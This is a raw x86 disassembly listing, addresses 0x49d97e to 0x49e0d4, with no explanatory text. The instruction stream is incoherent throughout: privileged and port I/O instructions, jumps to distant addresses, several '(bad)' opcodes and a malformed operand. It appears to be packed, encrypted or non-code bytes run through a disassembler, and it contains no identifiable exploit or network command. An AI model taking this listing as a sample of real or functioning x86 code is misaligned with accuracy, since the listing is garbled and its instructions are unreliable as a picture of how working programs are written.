  49d97e:	test   al,0x52
  49d980:	iret   
  49d981:	arpl   WORD PTR [ebx],dx
  49d983:	adc    al,BYTE PTR [edx]
  49d985:	push   ecx
  49d986:	push   ds
  49d987:	add    esi,ebp
  49d989:	fnsave [eax+esi*2+0x28f53995]
  49d990:	pop    esp
  49d991:	out    dx,al
  49d992:	pop    ss
  49d993:	cli    
  49d994:	shr    DWORD PTR [edi],0x9e
  49d997:	jmp    0x758f06e2
  49d99c:	fnsave [esi+0x5b3ce5e6]
  49d9a2:	js     0x49da01
  49d9a4:	aas    
  49d9a5:	shl    DWORD PTR [ebp+0x142db33],cl
  49d9ab:	dec    esp
  49d9ac:	sub    al,0x26
  49d9ae:	add    ebx,DWORD PTR [edi+0x77]
  49d9b1:	pusha  
  49d9b2:	cmp    eax,DWORD PTR ds:0xaeceb4a
  49d9b8:	inc    ebp
  49d9b9:	or     eax,0xcca4cb04
  49d9be:	cs push cs
  49d9c0:	pop    es
  49d9c1:	test   DWORD PTR [esi+0x18],ebp
  49d9c4:	add    DWORD PTR [edi*1+0x79d44cd],eax
  49d9cb:	and    al,0x78
  49d9cd:	(bad)  
  49d9cf:	pop    esi
  49d9d0:	jne    0x49d97a
  49d9d2:	sub    eax,0x7248ba25
  49d9d7:	cli    
  49d9d8:	bswap  eax
  49d9da:	pop    ebp
  49d9db:	jne    0x49d9e7
  49d9dd:	test   DWORD PTR [edi+0x44],0x2769c135
  49d9e4:	jo     0x49d9a2
  49d9e6:	(bad)  
  49d9e8:	pop    ebp
  49d9e9:	not    BYTE PTR [eax+0x1f]
  49d9ec:	push   edi
  49d9ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49d9ee:	pusha  
  49d9ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49d9f0:	push   0x35
  49d9f2:	inc    ebx
  49d9f3:	push   ebx
  49d9f4:	push   ecx
  49d9f5:	jne    0x49da1a
  49d9f7:	sbb    BYTE PTR [edx+esi*1+0x5],0x67
  49d9fc:	inc    ecx
  49d9fd:	xor    eax,0xb0e0e372
  49da02:	popf   
  49da03:	jne    0x49d9ba
  49da05:	jnp    0x49da67
  49da07:	add    BYTE PTR [edx-0x5311e8ea],0x93
  49da0e:	and    edx,DWORD PTR [eax+0x5e81f1a4]
  49da14:	add    BYTE PTR [esi],cl
  49da16:	cld    
  49da17:	pop    ecx
  49da18:	pop    eax
  49da19:	sti    
  49da1a:	or     eax,DWORD PTR [eax-0x4f]
  49da1d:	and    dh,BYTE PTR [esi]
  49da1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49da20:	lock jae 0x49da70
  49da23:	pop    esp
  49da24:	adc    ah,dl
  49da26:	inc    ecx
  49da27:	jl     0x49da45
  49da29:	push   edx
  49da2a:	lea    edx,[edi+0x5c]
  49da2d:	es push esi
  49da2f:	ja     0x49d9b1
  49da31:	mov    bh,0x6c
  49da33:	mov    esi,0x5c3ab1d9
  49da38:	aam    0xff
  49da3a:	(bad)  
  49da3b:	leave  
  49da3c:	cwde   
  49da3d:	popf   
  49da3e:	mov    esi,esi
  49da40:	les    edi,FWORD PTR [ebx+0xbf1414f]
  49da46:	mov    al,0xc8
  49da48:	sbb    al,0x2b
  49da4a:	cwde   
  49da4b:	bnd ja 0x49da60
  49da4e:	cmp    al,BYTE PTR [edi+0x60]
  49da51:	lock mov esp,0x36040e1d
  49da57:	ror    BYTE PTR [esi+0x18],cl
  49da5a:	popa   
  49da5b:	je     0x49da27
  49da5d:	inc    esi
  49da5e:	call   0xaa91f854
  49da63:	data16 je 0x49da7e
  49da66:	sub    al,0xe
  49da68:	fdivp  st(6),st
  49da6a:	jle    0x49da51
  49da6c:	push   cs
  49da6d:	stc    
  49da6e:	push   ss
  49da6f:	and    dl,0x1a
  49da72:	cli    
  49da73:	xor    BYTE PTR [edx+esi*8+0xd],0x8b
  49da78:	enter  0xa,0x7d
  49da7c:	sub    DWORD PTR [ecx+0x3ca28401],ecx
  49da82:	sbb    ch,BYTE PTR [ecx]
  49da84:	pop    edx
  49da85:	dec    ebp
  49da86:	shl    DWORD PTR [edx+0x5],0xfe
  49da8a:	push   ecx
  49da8b:	push   edx
  49da8c:	rep ins DWORD PTR es:[edi],dx
  49da8e:	add    DWORD PTR [edi+0x62],edi
  49da91:	or     BYTE PTR [eax-0xb901cfe],cl
  49da97:	call   0x803948ab
  49da9c:	outs   dx,DWORD PTR ds:[esi]
  49da9d:	mov    ebx,DWORD PTR [ecx]
  49da9f:	je     0x49dadc
  49daa1:	jmp    0x49dabf
  49daa3:	inc    esp
  49daa4:	sub    DWORD PTR [esp],edi
  49daa7:	test   BYTE PTR [edi-0x75ebdd2f],dh
  49daad:	fs dec ecx
  49daaf:	or     BYTE PTR [edi],bh
  49dab1:	xchg   edx,eax
  49dab2:	cmp    eax,ecx
  49dab4:	jle    0x49dab9
  49dab6:	sub    eax,0xd70fd3a3
  49dabb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49dabc:	adc    ebx,edi
  49dabe:	xor    BYTE PTR [ebx+0x14],dh
  49dac1:	call   0xe8f9a31b
  49dac6:	pop    edi
  49dac7:	(bad)  [ecx+0x6]
  49daca:	cmp    DWORD PTR [ebx],ecx
  49dacc:	jge    0x49dab8
  49dace:	or     ebp,eax
  49dad0:	mov    DWORD PTR [eax],esi
  49dad2:	pop    edi
  49dad3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49dad4:	ret    0x6091
  49dad7:	inc    eax
  49dad8:	cli    
  49dad9:	popf   
  49dada:	bound  esi,QWORD PTR [ecx+edx*4+0x2e597059]
  49dae1:	sbb    eax,0x141060fd
  49dae6:	adc    bl,BYTE PTR [ebx]
  49dae8:	mov    cl,0xe3
  49daea:	aad    0x5d
  49daec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49daed:	sbb    dl,BYTE PTR [eax+0x22]
  49daf0:	cs std 
  49daf2:	xor    esi,esi
  49daf4:	inc    edi
  49daf5:	and    al,0x86
  49daf7:	in     al,0x42
  49daf9:	test   BYTE PTR [edx-0x4db78530],bl
  49daff:	ret    0x6dd9
  49db02:	clc    
  49db03:	sbb    ecx,DWORD PTR [ebp+0x5640b634]
  49db09:	jb     0x49dadb
  49db0b:	inc    esp
  49db0c:	and    eax,0x12a0ed75
  49db11:	jp     0x49daac
  49db13:	add    BYTE PTR [eax+0x44310252],ch
  49db19:	pop    ss
  49db1a:	inc    esi
  49db1b:	jge    0x49db92
  49db1d:	adc    eax,ecx
  49db1f:	outs   dx,BYTE PTR ds:[esi]
  49db20:	aam    0x50
  49db22:	add    ebx,esp
  49db24:	test   BYTE PTR [edx],dh
  49db26:	push   0x200a895e
  49db2b:	sub    BYTE PTR [ecx],cl
  49db2d:	jbe    0x49daf2
  49db2f:	xor    bl,BYTE PTR [eax]
  49db31:	jge    0x49dba7
  49db33:	call   0x79fbe29a
  49db38:	int3   
  49db39:	lods   al,BYTE PTR ds:[esi]
  49db3a:	lea    ecx,[ecx+ecx*4]
  49db3d:	dec    esp
  49db3e:	dec    edx
  49db3f:	stc    
  49db40:	sub    BYTE PTR [eax],bh
  49db42:	dec    ecx
  49db43:	sub    al,0xfa
  49db45:	cmc    
  49db46:	xor    ebp,DWORD PTR [ecx]
  49db48:	test   esi,esp
  49db4a:	jns    0x49db13
  49db4c:	pop    es
  49db4d:	cmp    eax,ebp
  49db4f:	mov    eax,0xc7140e07
  49db54:	mov    cl,BYTE PTR [ecx+0x681ef5d]
  49db5a:	mov    esi,0x224004b2
  49db5f:	retf   0x26f5
  49db62:	test   al,dl
  49db64:	fld    DWORD PTR [ebx]
  49db66:	mov    esi,0x680dab91
  49db6b:	inc    eax
  49db6c:	sbb    DWORD PTR [ebp-0xd],esi
  49db6f:	popa   
  49db70:	inc    esi
  49db71:	rol    DWORD PTR [edx+0x28],0x20
  49db75:	pop    es
  49db76:	xor    esi,0xffffff80
  49db79:	xor    esp,ebx
  49db7b:	sub    al,0x75
  49db7d:	shr    DWORD PTR [eax+0x26],1
  49db80:	nop
  49db81:	leave  
  49db82:	lea    esp,[eax-0x26]
  49db85:	inc    ax
  49db87:	in     al,dx
  49db88:	mov    WORD PTR [ecx+edi*4-0x7b],?
  49db8c:	adc    eax,0x2c3b60f0
  49db91:	popa   
  49db92:	xchg   ebp,eax
  49db93:	xor    edx,edx
  49db95:	xchg   edi,eax
  49db96:	ds or  eax,0xf38bb660
  49db9c:	add    eax,0x1460d101
  49dba1:	inc    esi
  49dba2:	mov    esp,0x247a835e
  49dba7:	dec    esi
  49dba8:	shr    esi,0xaa
  49dbab:	and    esi,0xffffffc0
  49dbae:	lods   al,BYTE PTR ds:[esi]
  49dbaf:	jmp    0x49dbb7
  49dbb1:	fdiv   QWORD PTR ss:[ebx+eiz*2-0x6d]
  49dbb6:	ins    BYTE PTR es:[edi],dx
  49dbb7:	pop    esi
  49dbb8:	repnz adc DWORD PTR [ebx-0x16be3d1e],eax
  49dbbf:	push   ebp
  49dbc0:	ror    dl,1
  49dbc2:	scas   al,BYTE PTR es:[edi]
  49dbc3:	mov    cl,0x76
  49dbc5:	xchg   ecx,eax
  49dbc6:	shl    edx,0x27
  49dbc9:	ret    0x3f8c
  49dbcc:	stc    
  49dbcd:	out    dx,al
  49dbce:	mov    dh,0xcd
  49dbd0:	arpl   WORD PTR [edi],di
  49dbd2:	cmp    BYTE PTR [edi+edx*2+0x2],al
  49dbd6:	lods   eax,DWORD PTR ds:[esi]
  49dbd7:	mov    dh,0x66
  49dbd9:	and    eax,0x59ed5163
  49dbde:	dec    ecx
  49dbdf:	scas   al,BYTE PTR es:[edi]
  49dbe0:	imul   eax,DWORD PTR [ebx],0x24e16163
  49dbe6:	xlat   BYTE PTR ds:[ebx]
  49dbe7:	inc    esi
  49dbe8:	jns    0x49dbee
  49dbea:	add    eax,0x62f02949
  49dbef:	add    ah,dh
  49dbf1:	ret    0x2c7
  49dbf4:	sub    eax,0xffc4dc01
  49dbf9:	in     al,dx
  49dbfa:	js     0x49db89
  49dbfc:	push   eax
  49dbfd:	rcl    BYTE PTR [ebx+0x57],1
  49dc00:	cmp    edx,0x4a
  49dc03:	push   esp
  49dc04:	icebp  
  49dc05:	mov    eax,0xbfb05020
  49dc0a:	sbb    al,0x7a
  49dc0c:	outs   dx,BYTE PTR ds:[esi]
  49dc0d:	mov    dh,0xf8
  49dc0f:	imul   ebx,ebp,0x8bc01223
  49dc15:	ret    
  49dc16:	inc    edi
  49dc17:	bound  edi,QWORD PTR [eax+ecx*2]
  49dc1a:	sti    
  49dc1b:	test   BYTE PTR [ebx],bh
  49dc1d:	mov    al,ds:0xb7ba2fbe
  49dc22:	cld    
  49dc23:	push   ss
  49dc24:	mov    ebp,0x5aa0c9b
  49dc29:	dec    edi
  49dc2a:	mov    esi,0x8a622591
  49dc2f:	sbb    bh,BYTE PTR [esp+edi*1]
  49dc32:	imul   eax,edx,0xffffffdb
  49dc35:	xchg   ebp,eax
  49dc36:	jbe    0x49dc74
  49dc38:	daa    
  49dc39:	push   cs
  49dc3a:	hlt    
  49dc3b:	jnp    0x49dcb2
  49dc3d:	dec    eax
  49dc3e:	sub    al,0x2
  49dc40:	lea    edx,[ecx+0x2]
  49dc43:	push   ecx
  49dc44:	rol    DWORD PTR [edx+0xd],1
  49dc47:	sub    al,0x21
  49dc49:	cdq    
  49dc4a:	cmp    al,0x7e
  49dc4c:	and    BYTE PTR [ebp+0x71],ah
  49dc4f:	stos   DWORD PTR es:[edi],eax
  49dc50:	xchg   BYTE PTR [esi-0x93f6df4],al
  49dc56:	cmp    BYTE PTR ds:0x306f02a1,0x54
  49dc5d:	mov    al,BYTE PTR [edx+0x1]
  49dc60:	inc    edx
  49dc61:	jl     0x49dc47
  49dc63:	pop    ss
  49dc64:	mov    edi,ebp
  49dc66:	sub    BYTE PTR [ebx+0x41],ah
  49dc69:	jmp    0x49dc82
  49dc6b:	mov    dl,BYTE PTR [edx]
  49dc6d:	mov    eax,0x47b02277
  49dc72:	bnd jmp 0x49dc62
  49dc75:	mov    eax,0xb75ebd46
  49dc7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49dc7b:	ins    DWORD PTR es:[edi],dx
  49dc7c:	jbe    0x49dcb1
  49dc7e:	pop    esp
  49dc7f:	jns    0x49dc82
  49dc81:	les    edi,FWORD PTR [edx-0x213296b7]
  49dc87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49dc88:	je     0x49dc0e
  49dc8a:	and    BYTE PTR [ebx],dh
  49dc8c:	mov    al,BYTE PTR [edi+0x18adf851]
  49dc92:	xor    ecx,esi
  49dc94:	sub    BYTE PTR [ecx-0x73],al
  49dc97:	add    al,0x3a
  49dc99:	icebp  
  49dc9a:	out    0x36,al
  49dc9c:	into   
  49dc9d:	inc    edi
  49dc9e:	rcl    BYTE PTR [edi],1
  49dca0:	cmp    eax,0xee0e775
  49dca5:	mov    cl,0x85
  49dca7:	and    BYTE PTR [edi],cl
  49dca9:	popa   
  49dcaa:	cmp    eax,0x3321861a
  49dcaf:	jnp    0x49dcc5
  49dcb1:	inc    ecx
  49dcb2:	cmp    BYTE PTR [ecx],0xca
  49dcb5:	das    
  49dcb6:	cmp    DWORD PTR [edi+0x6b],eax
  49dcb9:	cwde   
  49dcba:	cmp    BYTE PTR [ecx],bl
  49dcbc:	cmp    dh,BYTE PTR [esi+0x12]
  49dcbf:	nop
  49dcc0:	fldcw  WORD PTR [ebx+0x48]
  49dcc3:	push   0xf557ec2
  49dcc8:	push   cs
  49dcc9:	sbb    ebp,DWORD PTR [eax+edi*2]
  49dccc:	sub    edx,eax
  49dcce:	lea    esi,[esi-0x46]
  49dcd1:	fld    QWORD PTR [esi+0x12]
  49dcd4:	mov    edx,0x7e08504b
  49dcd9:	and    eax,0xa563e5b8
  49dcde:	sub    DWORD PTR [eax],esi
  49dce0:	sar    DWORD PTR [esi+edi*8],0x2c
  49dce4:	or     al,0x51
  49dce6:	add    BYTE PTR [edx-0x377f79d5],0x19
  49dced:	sbb    al,0x43
  49dcef:	mov    al,ds:0x42f6c110
  49dcf4:	shl    BYTE PTR ds:0xd2a85143,1
  49dcfa:	mov    bh,0x68
  49dcfc:	mov    eax,ds:0x78267e32
  49dd01:	imul   eax,DWORD PTR [esi+0x34],0x54
  49dd05:	add    DWORD PTR [eax+edi*1],ebx
  49dd08:	jl     0x49dd12
  49dd0a:	dec    ecx
  49dd0b:	in     al,0xbb
  49dd0d:	fst    st(0)
  49dd0f:	scas   al,BYTE PTR es:[edi]
  49dd10:	jne    0x49dcfa
  49dd12:	xor    BYTE PTR [eax],cl
  49dd14:	mov    al,BYTE PTR [eax+0x72305243]
  49dd1a:	adc    ebp,DWORD PTR [ebp-0x20]
  49dd1d:	aas    
  49dd1e:	mov    ebx,0xe773708
  49dd23:	mov    bh,0x44
  49dd25:	ret    0x83d0
  49dd28:	sti    
  49dd29:	add    bh,BYTE PTR [esp+eiz*8+0x1]
  49dd2d:	cmp    BYTE PTR [edi-0x53],al
  49dd30:	jmp    0x72497f36
  49dd35:	or     dl,dh
  49dd37:	popf   
  49dd38:	dec    esp
  49dd39:	adc    al,0xbf
  49dd3b:	xor    esp,DWORD PTR [edx+0x50e2c186]
  49dd41:	inc    edx
  49dd42:	ja     0x49dd90
  49dd44:	inc    ebp
  49dd45:	xchg   ebp,eax
  49dd46:	or     BYTE PTR [edx],dl
  49dd48:	add    edi,0x423a6ab2
  49dd4e:	int    0xc4
  49dd50:	mov    dl,0xf6
  49dd52:	and    edi,edi
  49dd54:	xor    ah,dh
  49dd56:	sbb    al,0xe
  49dd58:	popa   
  49dd59:	fcomip st,st(1)
  49dd5b:	test   BYTE PTR [esi+0x20efa47c],0x33
  49dd62:	fist   DWORD PTR [edx]
  49dd64:	inc    ecx
  49dd65:	setge  bl
  49dd68:	cld    
  49dd69:	add    al,0x4b
  49dd6b:	and    ebx,0xfffffff9
  49dd6e:	aad    0x6f
  49dd70:	int    0xff
  49dd72:	add    ebx,0x37
  49dd75:	sub    eax,ebx
  49dd77:	mov    ebx,DWORD PTR [ebp-0x8]
  49dd7a:	add    eax,edi
  49dd7c:	cmp    bh,BYTE PTR [ecx+0x75]
  49dd7f:	mov    BYTE PTR [eax+0x5d846c3a],0xef
  49dd86:	push   edx
  49dd87:	and    esp,DWORD PTR [edi+ecx*1-0x3e42109]
  49dd8e:	out    0x6,al
  49dd90:	mov    al,0x50
  49dd92:	and    eax,0x7ec22043
  49dd97:	jp     0x49dda6
  49dd99:	add    esp,edi
  49dd9b:	out    0xc7,al
  49dd9d:	add    DWORD PTR [ebp-0x79870636],ecx
  49dda3:	push   es
  49dda4:	fisttp WORD PTR [ecx+0x8054363]
  49ddaa:	je     0x49de19
  49ddac:	iret   
  49ddad:	dec    ebp
  49ddae:	mov    bh,0x29
  49ddb0:	jle    0x49de23
  49ddb2:	cmp    esi,0xffffffdb
  49ddb5:	out    dx,al
  49ddb6:	rol    BYTE PTR [ebx-0x23e43d02],cl
  49ddbc:	xor    al,0x3f
  49ddbe:	dec    edx
  49ddbf:	and    edx,0xffffffc2
  49ddc2:	ret    0xc603
  49ddc5:	mov    bl,0xca
  49ddc7:	jmp    0x49dd8a
  49ddc9:	mov    dl,BYTE PTR [ebx+eiz*4+0x43]
  49ddcd:	stc    
  49ddce:	inc    ecx
  49ddcf:	(bad)  
  49ddd0:	mov    ds:0xe76114ab,eax
  49ddd5:	add    ah,BYTE PTR [esi]
  49ddd7:	or     bh,BYTE PTR [esi+0x1f]
  49ddda:	mov    al,ds:0x4432a8a8
  49dddf:	pop    ds
  49dde0:	mov    ah,0x9f
  49dde2:	jb     0x49ddfd
  49dde4:	xor    al,BYTE PTR [eax-0xf9ef2f1]
  49ddea:	inc    eax
  49ddeb:	fmul   QWORD PTR [esi+0x4051f77a]
  49ddf1:	je     0x49ddfc
  49ddf3:	inc    ecx
  49ddf4:	es pop esp
  49ddf6:	hlt    
  49ddf7:	jne    0x49de08
  49ddf9:	aas    
  49ddfa:	sti    
  49ddfb:	mov    BYTE PTR [esi],bh
  49ddfd:	add    eax,0x5b5f9309
  49de02:	test   DWORD PTR [eax+0xe],0x89745e20
  49de09:	adc    dl,0xb4
  49de0c:	or     edi,DWORD PTR [ebx+ecx*1+0x5]
  49de10:	call   0xa89:0xb8f01f88
  49de17:	rcl    BYTE PTR [eax-0x52f04dc],0x9e
  49de1e:	stos   WORD PTR es:[edi],ax
  49de20:	and    BYTE PTR [eax],al
  49de22:	stc    
  49de23:	push   cs
  49de24:	and    edi,esp
  49de26:	mov    ch,0x68
  49de28:	dec    eax
  49de29:	mov    edx,0x5726f8c5
  49de2e:	cld    
  49de2f:	mov    DWORD PTR [ecx],eax
  49de31:	push   es
  49de32:	xchg   edx,eax
  49de33:	out    0x1b,eax
  49de35:	in     eax,dx
  49de36:	add    dl,BYTE PTR [ecx]
  49de38:	aas    
  49de39:	add    eax,DWORD PTR [ecx+ebp*2]
  49de3c:	or     BYTE PTR es:[eax],bl
  49de3f:	add    eax,0x77d3c03b
  49de44:	fwait
  49de45:	jo     0x49de43
  49de47:	fcomp  QWORD PTR [eax]
  49de49:	nop
  49de4a:	mov    dl,BYTE PTR [eax]
  49de4c:	inc    eax
  49de4d:	and    al,BYTE PTR [ecx]
  49de4f:	push   0xf9757402
  49de54:	cmp    BYTE PTR [edx+0x49],ah
  49de57:	mov    al,0x94
  49de59:	aaa    
  49de5a:	stos   BYTE PTR es:[edi],al
  49de5b:	pushf  
  49de5c:	lock mov ah,0x7c
  49de5f:	int3   
  49de60:	dec    eax
  49de61:	add    BYTE PTR [edx+0x1c60b631],cl
  49de67:	inc    esp
  49de68:	jb     0x49de72
  49de6a:	ret    0x6127
  49de6d:	jl     0x49dee3
  49de6f:	sub    BYTE PTR [esi-0x214978e0],dh
  49de75:	enter  0x2f5c,0xae
  49de79:	push   cs
  49de7a:	jns    0x49de1b
  49de7c:	daa    
  49de7d:	push   0x2eeefe08
  49de82:	fsubr  st,st(3)
  49de84:	pop    es
  49de85:	adc    ah,bl
  49de87:	xchg   ebp,eax
  49de88:	mov    bh,0x9
  49de8a:	mul    DWORD PTR [ecx+0x327c3ee8]
  49de90:	push   eax
  49de91:	and    ah,dh
  49de93:	in     al,0x2
  49de95:	arpl   WORD PTR [edx],cx
  49de97:	aas    
  49de98:	push   eax
  49de99:	mov    DWORD PTR ds:0xd9ece7e6,0x1e1970c2
  49dea3:	sub    eax,0xd0f0b200
  49dea8:	jns    0x49debc
  49deaa:	hlt    
  49deab:	bound  edi,QWORD PTR [ecx-0x84774cd]
  49deb1:	cmp    DWORD PTR ds:0x66f43fe0,edi
  49deb7:	sub    al,0x2c
  49deb9:	cld    
  49deba:	jnp    0x49df30
  49debc:	pop    ds
  49debd:	(bad)
  49dec0:	xchg   ebx,eax
  49dec1:	sub    DWORD PTR [eax+0x48ea11f0],ebp
  49dec7:	xor    al,0x8a
  49dec9:	test   al,0xe1
  49decb:	cld    
  49decc:	add    BYTE PTR [esi],ah
  49dece:	pushf  
  49decf:	mov    dh,0x78
  49ded1:	push   ecx
  49ded2:	push   edx
  49ded3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49ded4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49ded5:	sub    ecx,DWORD PTR fs:[edx-0x33]
  49ded9:	gs sub al,0x4
  49dedc:	iret   
  49dedd:	adc    dh,BYTE PTR [ecx+0x6b]
  49dee0:	and    eax,0x5250c1eb
  49dee5:	int    0x53
  49dee7:	ss dec esp
  49dee9:	and    eax,0xd4690d48
  49deee:	xor    dh,BYTE PTR [ebx+0xc]
  49def1:	xor    al,0x9b
  49def3:	dec    ebp
  49def4:	cmc    
  49def5:	push   0xa
  49def7:	xor    BYTE PTR [eax],ch
  49def9:	es test eax,0x1cb3df18
  49deff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49df00:	leave  
  49df01:	dec    BYTE PTR [eax+eax*1]
  49df04:	and    al,0x65
  49df06:	mov    fs,WORD PTR [ebx+0x6d]
  49df09:	stos   BYTE PTR es:[edi],al
  49df0a:	mov    ebp,ebp
  49df0c:	mov    ebp,0x205a4007
  49df11:	push   esi
  49df12:	mov    eax,DWORD PTR [ecx-0x7d]
  49df15:	mov    BYTE PTR [ecx-0x1f],cl
  49df18:	xchg   DWORD PTR ds:0x15c30c6a,ebp
  49df1e:	or     BYTE PTR [eax],ah
  49df20:	loope  0x49df22
  49df22:	icebp  
  49df23:	bound  esp,QWORD PTR [edx+0x5]
  49df26:	bound  esi,QWORD PTR [edx-0x5f7c77ac]
  49df2c:	daa    
  49df2d:	lea    ecx,[edi+0x32]
  49df30:	loop   0x49df6d
  49df32:	xor    BYTE PTR [eax-0x2037f92c],0x17
  49df39:	sbb    ecx,DWORD PTR [eax]
  49df3b:	pop    eax
  49df3c:	dec    ebx
  49df3d:	cdq    
  49df3e:	pop    sp
  49df40:	sar    DWORD PTR [esi],cl
  49df42:	pop    ecx
  49df43:	xor    dl,BYTE PTR [esi-0x62]
  49df46:	mov    DWORD PTR [ecx+0xc],edx
  49df49:	rcr    dl,cl
  49df4b:	dec    esi
  49df4c:	adc    bh,al
  49df4e:	dec    edx
  49df4f:	or     BYTE PTR [ebx],bh
  49df51:	push   es
  49df52:	hlt    
  49df53:	push   ss
  49df54:	cmp    ecx,esp
  49df56:	jne    0x49df80
  49df58:	and    al,0x12
  49df5a:	rcr    DWORD PTR [edx],1
  49df5c:	dec    esi
  49df5d:	dec    ebx
  49df5e:	add    al,BYTE PTR [ecx-0x8ec803]
  49df64:	dec    esi
  49df65:	or     BYTE PTR [edi-0x79],bl
  49df68:	in     al,dx
  49df69:	(bad)  
  49df6b:	ins    BYTE PTR es:[edi],dx
  49df6c:	jmp    FWORD PTR [ebx]
  49df6e:	mov    BYTE PTR [eax+0x52],dl
  49df71:	push   ecx
  49df72:	and    eax,0xc28812ef
  49df77:	cvtdq2ps xmm4,XMMWORD PTR [eax+0x5e]
  49df7b:	add    al,0x6c
  49df7d:	out    dx,eax
  49df7e:	xor    BYTE PTR [edx+0xf],0xd1
  49df82:	sbb    edi,DWORD PTR [ebx+0x70]
  49df85:	xor    BYTE PTR [ebx+0x75a5182c],0x21
  49df8c:	fnstcw WORD PTR [edx-0x5b]
  49df8f:	push   edi
  49df90:	lea    ebx,[edx+0x57]
  49df93:	push   cs
  49df94:	out    dx,al
  49df95:	inc    ebx
  49df96:	mov    ch,0x67
  49df98:	fst    QWORD PTR [edx+0x2]
  49df9b:	push   esi
  49df9c:	mov    DWORD PTR [esi+0x323041e3],ebx
  49dfa2:	mov    ecx,cs
  49dfa4:	pop    ds
  49dfa5:	inc    ecx
  49dfa6:	ins    BYTE PTR es:[edi],dx
  49dfa7:	outs   dx,DWORD PTR ds:[esi]
  49dfa8:	or     ecx,DWORD PTR [eax-0x35]
  49dfab:	inc    edx
  49dfac:	add    al,0x59
  49dfae:	push   ebp
  49dfaf:	pop    ebx
  49dfb0:	sub    eax,0x33596191
  49dfb5:	sub    al,0xef
  49dfb7:	and    DWORD PTR ds:[ecx],esi
  49dfba:	test   eax,0x454ff87
  49dfbf:	inc    eax
  49dfc0:	adc    BYTE PTR [ecx],cl
  49dfc2:	arpl   WORD PTR [ecx],ax
  49dfc4:	cld    
  49dfc5:	std    
  49dfc6:	div    BYTE PTR [esi]
  49dfc8:	add    al,0x83
  49dfca:	dec    edi
  49dfcb:	cmp    ebp,DWORD PTR [esp+ecx*8]
  49dfce:	cwde   
  49dfcf:	xchg   BYTE PTR [esp+edx*2+0x6a5703f7],al
  49dfd6:	test   BYTE PTR [esi+0x59],al
  49dfd9:	lea    eax,[edx]
  49dfdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49dfdc:	rol    BYTE PTR [edx],1
  49dfde:	mov    bl,0x3
  49dfe0:	or     al,0xd0
  49dfe2:	fldenv [ecx]
  49dfe4:	mov    al,0xcc
  49dfe6:	sub    esp,eax
  49dfe8:	add    BYTE PTR [eax],dl
  49dfea:	out    dx,eax
  49dfeb:	pop    eax
  49dfec:	jo     0x49e045
  49dfee:	jnp    0x49df82
  49dff0:	sbb    BYTE PTR [ebx-0x80],0x6b
  49dff4:	jo     0x49e06e
  49dff6:	ret    0x494e
  49dff9:	add    DWORD PTR [eax],ebx
  49dffb:	popa   
  49dffc:	je     0x49e016
  49dffe:	add    bl,ch
  49e000:	mov    dh,0xad
  49e002:	loope  0x49e03a
  49e004:	jg     0x49e00a
  49e006:	int    0x91
  49e008:	lock ss loopne 0x49dfe4
  49e00c:	pop    ebp
  49e00d:	in     al,dx
  49e00e:	xor    DWORD PTR [ebp+0x39],0x3c2d6603
  49e015:	add    ebp,DWORD PTR [eax]
  49e017:	and    al,0x6
  49e019:	add    al,0xeb
  49e01b:	inc    esi
  49e01c:	and    eax,0x91c811dc
  49e021:	sub    bl,BYTE PTR ds:0xa58184f3
  49e027:	jl     0x49e066
  49e029:	sar    DWORD PTR ds:0xeb0ec120,1
  49e02f:	add    al,0x6
  49e031:	arpl   WORD PTR [edx-0x455bf172],dx
  49e037:	pop    edi
  49e038:	xchg   DWORD PTR [ecx],edx
  49e03a:	fs ins BYTE PTR es:[edi],dx
  49e03c:	and    al,0x8d
  49e03e:	ror    cl,0x30
  49e041:	mov    ch,0xfb
  49e043:	popa   
  49e044:	xor    al,0x1a
  49e046:	dec    ebp
  49e047:	ds and al,0x2e
  49e04a:	js     0x49dfcc
  49e04c:	jle    0x49e002
  49e04e:	ror    DWORD PTR [ebx],cl
  49e050:	add    DWORD PTR [ecx+0x4b2b4a51],ebx
  49e056:	adc    eax,0x93880200
  49e05b:	daa    
  49e05c:	sub    BYTE PTR [ecx],ah
  49e05e:	or     ecx,DWORD PTR [ebp+0x5be96b67]
  49e064:	ds push edi
  49e066:	xor    al,0xbc
  49e068:	and    bl,al
  49e06a:	cmp    eax,0xc89734a8
  49e06f:	adc    al,0xb8
  49e071:	lock mov edx,0x2d4656db
  49e077:	lods   eax,DWORD PTR ds:[esi]
  49e078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49e079:	sbb    BYTE PTR [eax-0x4e578996],dh
  49e07f:	lock mov esp,0x82b44c7b
  49e085:	sub    dh,BYTE PTR [edi+edx*2+0x4e09f4cd]
  49e08c:	(bad)  
  49e08d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49e08e:	and    BYTE PTR [esi],ah
  49e090:	adc    BYTE PTR [eax],ch
  49e092:	loope  0x49e0b2
  49e094:	and    ah,al
  49e096:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49e097:	stc    
  49e098:	push   0xcb9429f8
  49e09d:	ret    0x7b2b
  49e0a0:	push   ecx
  49e0a1:	add    DWORD PTR [ecx],ecx
  49e0a3:	in     eax,dx
  49e0a4:	test   dl,dl
  49e0a6:	loop   0x49e0e8
  49e0a8:	les    edx,FWORD PTR [eax]
  49e0aa:	push   eax
  49e0ab:	sub    ebp,ecx
  49e0ad:	or     eax,0xccf8c2c1
  49e0b2:	shl    BYTE PTR [edx],0x56
  49e0b5:	ret    0x3c80
  49e0b8:	xor    edx,DWORD PTR [edx-0x2b5effa0]
  49e0be:	push   es
  49e0bf:	dec    edx
  49e0c0:	rol    BYTE PTR [eax],cl
  49e0c2:	pop    ds
  49e0c3:	test   eax,0x4ea56af6
  49e0c8:	fcmovnbe st,st(3)
  49e0ca:	sbb    BYTE PTR [edx-0x1e],dl
  49e0cd:	sub    BYTE PTR [esi-0x68bcc67d],ah
  49e0d3:	push   ss
  49e0d4:	ds jo  0x49e14c
